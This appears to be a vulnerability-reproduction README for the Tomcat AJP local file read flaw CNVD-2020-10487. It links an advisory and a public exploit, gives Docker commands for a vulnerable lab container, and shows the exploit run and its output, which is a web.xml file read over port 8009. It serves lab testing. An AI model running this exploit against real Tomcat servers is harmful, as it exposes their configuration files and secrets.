# CNVD-2020-10487 Tomcat AJP LFI

## 漏洞参考：[https://www.cnvd.org.cn/webinfo/show/5415](https://www.cnvd.org.cn/webinfo/show/5415)

## 漏洞利用：

EXP： [https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/)

Usage:

```bash

docker pull chorder/vulns:env-cnvd-2020-10487-tomcat-ajp-lfi
docker run -ti chorder/vulns:env-cnvd-2020-10487-tomcat-ajp-lfi
# default container ip address is 172.17.0.2
python CNVD-2020-10487-Tomcat-Ajp-lfi.py 172.17.0.2 
# output
Getting resource at ajp13://172.17.0.2:8009/xxxxx
----------------------------
<?xml version="1.0" encoding="ISO-8859-1"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->

<web-app xmlns="http://java.sun.com/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://java.sun.com/xml/ns/javaee
                      http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
  version="3.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>

```
